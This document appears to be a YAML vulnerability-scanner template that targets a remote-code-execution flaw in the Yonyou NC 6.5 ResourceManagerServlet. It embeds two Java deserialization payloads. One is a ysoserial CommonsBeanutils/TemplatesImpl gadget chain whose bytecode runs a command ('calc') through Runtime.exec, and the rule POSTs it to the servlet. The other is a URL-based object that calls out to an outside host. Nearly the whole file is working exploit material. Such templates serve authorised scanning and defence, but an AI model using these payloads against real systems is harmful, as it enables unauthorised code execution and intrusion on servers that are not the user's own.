name: nc65-ResourceManagerServlet-rce
transport: http
set:
  r1: b"\xAC\xED\x00\x05\x73\x72\x00\x11\x6A\x61\x76\x61\x2E\x75\x74\x69\x6C\x2E\x48\x61\x73\x68\x4D\x61\x70\x05\x07\xDA\xC1\xC3\x16\x60\xD1\x03\x00\x02\x46\x00\x0A\x6C\x6F\x61\x64\x46\x61\x63\x74\x6F\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6F\x6C\x64\x78\x70\x3F\x40\x00\x00\x00\x00\x00\x0C\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x73\x72\x00\x0C\x6A\x61\x76\x61\x2E\x6E\x65\x74\x2E\x55\x52\x4C\x96\x25\x37\x36\x1A\xFC\xE4\x72\x03\x00\x07\x49\x00\x08\x68\x61\x73\x68\x43\x6F\x64\x65\x49\x00\x04\x70\x6F\x72\x74\x4C\x00\x09\x61\x75\x74\x68\x6F\x72\x69\x74\x79\x74\x00\x12\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x53\x74\x72\x69\x6E\x67\x3B\x4C\x00\x04\x66\x69\x6C\x65\x71\x00\x7E\x00\x03\x4C\x00\x04\x68\x6F\x73\x74\x71\x00\x7E\x00\x03\x4C\x00\x08\x70\x72\x6F\x74\x6F\x63\x6F\x6C\x71\x00\x7E\x00\x03\x4C\x00\x03\x72\x65\x66\x71\x00\x7E\x00\x03\x78\x70\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x74\x00\x0B\x74\x72\x67\x61\x6E\x64\x61\x2E\x74\x6F\x70\x74\x00\x00\x71\x00\x7E\x00\x05\x74\x00\x04\x68\x74\x74\x70\x70\x78\x74\x00\x12\x68\x74\x74\x70\x3A\x2F\x2F\x74\x72\x67\x61\x6E\x64\x61\x2E\x74\x6F\x70\x78"
  r2: b"\xAC\xED\x00\x05sr\x00\x17java.util.PriorityQueue\x94\xDA0\xB4\xFB?\x82\xB1\x03\x00\x02I\x00\x04sizeL\x00\x0Acomparatort\x00\x16Ljava/util/Comparator;xp\x00\x00\x00\x02sr\x00+org.apache.commons.beanutils.BeanComparator\xE3\xA1\x88\xEAs\x22\xA4H\x02\x00\x02L\x00\x0Acomparatorq\x00~\x00\x01L\x00\x08propertyt\x00\x12Ljava/lang/String;xpsr\x00?org.apache.commons.collections.comparators.ComparableComparator\xFB\xF4\x99%\xB8n\xB17\x02\x00\x00xpt\x00\x10outputPropertiesw\x04\x00\x00\x00\x03sr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\x09WO\xC1n\xAC\xAB3\x03\x00\x06I\x00\x0D_indentNumberI\x00\x0E_transletIndex[\x00\x0A_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_nameq\x00~\x00\x04L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xFF\xFF\xFF\xFFur\x00\x03[[BK\xFD\x19\x15gg\xDB7\x02\x00\x00xp\x00\x00\x00\x02ur\x00\x02[B\xAC\xF3\x17\xF8\x06\x08T\xE0\x02\x00\x00xp\x00\x00\x06\x96\xCA\xFE\xBA\xBE\x00\x00\x002\x009\x0A\x00\x03\x00\x22\x07\x007\x07\x00%\x07\x00&\x01\x00\x10serialVersionUID\x01\x00\x01J\x01\x00\x0DConstantValue\x05\xAD \x93\xF3\x91\xDD\xEF>\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0FLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00\x13StubTransletPayload\x01\x00\x0CInnerClasses\x01\x005Lysoserial/payloads/util/Gadgets$StubTransletPayload;\x01\x00\x09transform\x01\x00r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V\x01\x00\x08document\x01\x00-Lcom/sun/org/apache/xalan/internal/xsltc/DOM;\x01\x00\x08handlers\x01\x00B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;\x01\x00\x0AExceptions\x07\x00\x27\x01\x00\xA6(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V\x01\x00\x08iterator\x01\x005Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;\x01\x00\x07handler\x01\x00ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;\x01\x00\x0ASourceFile\x01\x00\x0CGadgets.java\x0C\x00\x0A\x00\x0B\x07\x00(\x01\x003ysoserial/payloads/util/Gadgets$StubTransletPayload\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x01\x00\x14java/io/Serializable\x01\x009com/sun/org/apache/xalan/internal/xsltc/TransletException\x01\x00\x1Fysoserial/payloads/util/Gadgets\x01\x00\x08<clinit>\x01\x00\x11java/lang/Runtime\x07\x00*\x01\x00\x0AgetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x0C\x00,\x00-\x0A\x00+\x00.\x01\x00\x04calc\x08\x000\x01\x00\x04exec\x01\x00\x27(Ljava/lang/String;)Ljava/lang/Process;\x0C\x002\x003\x0A\x00+\x004\x01\x00\x0DStackMapTable\x01\x00\x1Cysoserial/Pwner3815348648291\x01\x00\x1ELysoserial/Pwner3815348648291;\x00!\x00\x02\x00\x03\x00\x01\x00\x04\x00\x01\x00\x1A\x00\x05\x00\x06\x00\x01\x00\x07\x00\x00\x00\x02\x00\x08\x00\x04\x00\x01\x00\x0A\x00\x0B\x00\x01\x00\x0C\x00\x00\x00/\x00\x01\x00\x01\x00\x00\x00\x05*\xB7\x00\x01\xB1\x00\x00\x00\x02\x00\x0D\x00\x00\x00\x06\x00\x01\x00\x00\x00/\x00\x0E\x00\x00\x00\x0C\x00\x01\x00\x00\x00\x05\x00\x0F\x008\x00\x00\x00\x01\x00\x13\x00\x14\x00\x02\x00\x0C\x00\x00\x00?\x00\x00\x00\x03\x00\x00\x00\x01\xB1\x00\x00\x00\x02\x00\x0D\x00\x00\x00\x06\x00\x01\x00\x00\x004\x00\x0E\x00\x00\x00 \x00\x03\x00\x00\x00\x01\x00\x0F\x008\x00\x00\x00\x00\x00\x01\x00\x15\x00\x16\x00\x01\x00\x00\x00\x01\x00\x17\x00\x18\x00\x02\x00\x19\x00\x00\x00\x04\x00\x01\x00\x1A\x00\x01\x00\x13\x00\x1B\x00\x02\x00\x0C\x00\x00\x00I\x00\x00\x00\x04\x00\x00\x00\x01\xB1\x00\x00\x00\x02\x00\x0D\x00\x00\x00\x06\x00\x01\x00\x00\x008\x00\x0E\x00\x00\x00*\x00\x04\x00\x00\x00\x01\x00\x0F\x008\x00\x00\x00\x00\x00\x01\x00\x15\x00\x16\x00\x01\x00\x00\x00\x01\x00\x1C\x00\x1D\x00\x02\x00\x00\x00\x01\x00\x1E\x00\x1F\x00\x03\x00\x19\x00\x00\x00\x04\x00\x01\x00\x1A\x00\x08\x00)\x00\x0B\x00\x01\x00\x0C\x00\x00\x00$\x00\x03\x00\x02\x00\x00\x00\x0F\xA7\x00\x03\x01L\xB8\x00/\x121\xB6\x005W\xB1\x00\x00\x00\x01\x006\x00\x00\x00\x03\x00\x01\x03\x00\x02\x00 \x00\x00\x00\x02\x00!\x00\x11\x00\x00\x00\x0A\x00\x01\x00\x02\x00#\x00\x10\x00\x09uq\x00~\x00\x10\x00\x00\x01\xD4\xCA\xFE\xBA\xBE\x00\x00\x002\x00\x1B\x0A\x00\x03\x00\x15\x07\x00\x17\x07\x00\x18\x07\x00\x19\x01\x00\x10serialVersionUID\x01\x00\x01J\x01\x00\x0DConstantValue\x05q\xE6i\xEE<mG\x18\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0FLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00\x03Foo\x01\x00\x0CInnerClasses\x01\x00%Lysoserial/payloads/util/Gadgets$Foo;\x01\x00\x0ASourceFile\x01\x00\x0CGadgets.java\x0C\x00\x0A\x00\x0B\x07\x00\x1A\x01\x00#ysoserial/payloads/util/Gadgets$Foo\x01\x00\x10java/lang/Object\x01\x00\x14java/io/Serializable\x01\x00\x1Fysoserial/payloads/util/Gadgets\x00!\x00\x02\x00\x03\x00\x01\x00\x04\x00\x01\x00\x1A\x00\x05\x00\x06\x00\x01\x00\x07\x00\x00\x00\x02\x00\x08\x00\x01\x00\x01\x00\x0A\x00\x0B\x00\x01\x00\x0C\x00\x00\x00/\x00\x01\x00\x01\x00\x00\x00\x05*\xB7\x00\x01\xB1\x00\x00\x00\x02\x00\x0D\x00\x00\x00\x06\x00\x01\x00\x00\x00<\x00\x0E\x00\x00\x00\x0C\x00\x01\x00\x00\x00\x05\x00\x0F\x00\x12\x00\x00\x00\x02\x00\x13\x00\x00\x00\x02\x00\x14\x00\x11\x00\x00\x00\x0A\x00\x01\x00\x02\x00\x16\x00\x10\x00\x09pt\x00\x04Pwnrpw\x01\x00xq\x00~\x00\x0Dx"
rules:
  r0:
    request:
      method: POST
      path: /servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet
      body: |
        {{r2}}
      headers:
        Content-Type: application/octet-stream
    expression: response.status == 200
expression: r0()
detail:
  author: trganda
  links:
    - https://github.com/ax1sX/SecurityList/blob/main/Yongyou/yongyou_NC_Audit.md